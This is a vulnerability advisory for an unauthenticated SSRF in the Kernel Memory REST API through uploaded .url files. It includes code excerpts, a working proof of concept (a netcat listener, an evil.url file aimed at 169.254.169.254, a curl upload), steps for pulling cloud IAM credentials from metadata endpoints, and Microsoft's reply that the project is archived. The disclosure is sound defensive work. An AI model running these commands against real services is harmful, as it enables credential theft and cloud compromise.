https://github.com/microsoft/kernel-memory

Title: Unauthenticated SSRF via .url file upload in REST API

Package: Microsoft.KernelMemory.Service / kernelmemory/service Docker image

Affected Versions: <= 0.98.0 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N

CVSS Score: 8.6 (High)

CWE: CWE-918


### Summary

The Kernel Memory REST API service contains a Server-Side Request Forgery (SSRF) vulnerability. An unauthenticated attacker can upload a file with a `.url` extension containing an arbitrary URL, causing the server to make an outbound HTTP request to that URL -- including requests to internal network resources such as cloud metadata endpoints (e.g., `http://169.254.169.254/`).

### Details

**Authentication disabled by default**

`ServiceAuthorizationConfig.Enabled` defaults to `false` in `appsettings.json`. All API endpoints (including the document upload endpoint) are accessible without any credentials in a default deployment.

**SSRF trigger path**

1. The upload endpoint (`POST /`) accepts multipart form data containing one or more files.
2. In `BaseOrchestrator.ImportDocumentAsync()`, the MIME type is determined from the uploaded filename's extension using `IMimeTypeDetection.GetFileType()`. The `.url` extension maps to `MimeTypes.WebPageUrl` (`text/x-uri`), defined in `Abstractions/Pipeline/MimeTypes.cs`.
3. During pipeline execution, `TextExtractionHandler.InvokeAsync()` checks whether the MIME type equals `MimeTypes.WebPageUrl`. If so, it calls `DownloadContentAsync()`, which reads the file contents as a URL string and passes it directly to `WebScraper.GetContentAsync()`.
4. `WebScraper.GetContentAsync()` (in `Core/DataFormats/WebPages/WebScraper.cs`) only validates that the URL scheme is `http` or `https`, then issues an `HttpClient.GetAsync()` call with no hostname or IP restriction.

**Validation bypass**

The SDK-level method `MemoryService.ImportWebPageAsync()` calls `Verify.ValidateUrl(allowReservedIp: false)` before processing. However, the REST API file upload path never calls `Verify.ValidateUrl()`. An attacker who uploads a `.url` file directly via the REST API bypasses this check entirely.

**Relevant code**

`service/Core/DataFormats/WebPages/WebScraper.cs`:
```csharp
var scheme = url.Scheme.ToUpperInvariant();
if (scheme is not "HTTP" and not "HTTPS")
{
    return new WebScraperResult { Success = false, Error = $"Unknown URL protocol: {url.Scheme}" };
}
// No IP/hostname check -- fetches blindly
HttpResponseMessage? response = await this._httpClient.GetAsync(url, cancellationToken);
```

`service/Core/Handlers/TextExtractionHandler.cs` (lines 82-84):
```csharp
if (uploadedFile.MimeType == MimeTypes.WebPageUrl)
{
    var (downloadedPage, pageContent, skip) = await this.DownloadContentAsync(uploadedFile, fileContent, cancellationToken);
```

`service/Core/Pipeline/BaseOrchestrator.cs` (MIME type from filename):
```csharp
mimeType = this._mimeTypeDetection.GetFileType(file.FileName); // "evil.url" -> "text/x-uri"
```

### PoC

**Prerequisites**
- A running instance of `kernelmemory/service` (Docker image) with default configuration (`ServiceAuthorization.Enabled: false`). No API key or other credential is required.
- An HTTP listener on the attacker-controlled machine or an internal address.

**Steps**

Start a listener to capture the incoming request:
```bash
nc -l -p 8888 -v
```

Create a `.url` file containing the SSRF target:
```bash
echo -n 'http://169.254.169.254/latest/meta-data/' > evil.url
```

Upload the file to the unauthenticated REST API:
```bash
curl -X POST http://<km-service>:9001/upload \
  -F "file=@evil.url;type=application/octet-stream" \
  -F "documentId=ssrf-001"
```

**Observed output on the listener (live-validated against kernelmemory/service:latest, 2026-06-13)**
```
Listening on 0.0.0.0 8888
Connection received on 172.17.0.2 37858
GET / HTTP/1.1
Host: 172.17.0.1:8888
User-Agent: Kernel-Memory
traceparent: 00-c2d066e5aa47e72017e74aab34851582-668f7f1f3d36b993-00
```

The Kernel Memory service (container at 172.17.0.2) made an outbound `GET` request to the attacker-supplied URL, confirming server-side request execution.

**Cloud metadata exfiltration**

Replace the listener URL with `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IMDSv1) or `http://metadata.google.internal/computeMetadata/v1/` to retrieve cloud instance credentials.

### Impact

An unauthenticated attacker who can reach the Kernel Memory API can:
- Probe and access internal network hosts and services not exposed publicly (SSRF pivot).
- Retrieve cloud provider metadata credentials (IAM roles, service account tokens) via the instance metadata service, leading to full cloud account compromise.
- Enumerate internal services and obtain responses from HTTP endpoints inside the deployment network.

The vulnerability is present in the default deployment configuration where `ServiceAuthorization.Enabled` is `false`.

### Disclosure

- 13 Jun 2026: Reported to Microsoft https://msrc.microsoft.com/report/vulnerability/VULN-195160
- 15 Jun 2026: Microsoft closed out the ticket and responded:
```
Thank you for contacting the Microsoft Security Response Center (MSRC).
We appreciate your effort to help protect customers.
We have reviewed your report and determined that the described behavior does not meet Microsoft’s definition of a security vulnerability.
This is an archived research project. Explicit warnings are present that this not production software. Use it with caution, and at your own risk.
```
